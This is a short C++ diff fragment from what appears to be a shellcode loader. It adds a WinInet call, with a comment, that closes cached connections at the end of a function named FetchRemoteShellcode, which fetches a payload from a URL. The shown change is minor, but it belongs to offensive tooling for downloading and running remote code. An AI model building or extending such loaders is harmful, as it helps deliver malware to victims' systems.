@@ -88,6 +88,9 @@ bool FetchRemoteShellcode(const string& url, vector<char>& outShellcode) {
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 
+    //Calling InternetSetOptionW with the INTERNET_OPTION_SETTINGS_CHANGED flag will cause the system to update the cached version of its internet settings and thus resulting in the connections saved by WinInet being closed
+    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+
     return true;
 }
 
